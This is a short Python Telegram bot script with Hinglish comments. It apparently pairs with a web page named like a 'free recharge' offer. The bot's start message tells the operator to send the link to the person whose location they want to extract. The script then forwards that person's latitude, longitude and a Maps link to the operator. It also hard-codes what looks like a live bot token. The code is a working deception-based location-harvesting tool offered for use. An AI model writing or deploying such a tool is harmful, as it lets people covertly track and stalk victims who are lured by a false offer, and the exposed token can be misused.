# -*- coding: utf-8 -*-
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ---------- YAHAN APNA DATA DAALEIN ----------
BOT_TOKEN = "8827313246:AAGKiH61pMD4IXzR_EvHUIBx8KYebBYoYYE"  # @BotFather se naya token le kar yahan daalein
WEBAPP_URL = "https://free-recharge-saif.vercel.app"  # Yeh aapka deployed link hai

# ---------- BOT CODE ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🔗 Generate Shareable Link", web_app=WebAppInfo(url=WEBAPP_URL))]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"👋 Jis bande ki location nikalni hai, use yeh link bhejo.\n"
        f"Jab woh location share karega, toh location aapko mil jaayegi.",
        reply_markup=reply_markup
    )

async def receive_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        data = json.loads(update.effective_message.web_app_data.data)
        if data.get('action') == 'live_location':
            lat = data.get('latitude')
            lon = data.get('longitude')
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            await update.message.reply_text(
                f"🔔 *Location Received!*\nLat: {lat}\nLon: {lon}\n[Open in Google Maps]({maps_link})",
                parse_mode="Markdown"
            )
    except Exception as e:
        print("Error:", e)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, receive_webapp_data))
    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()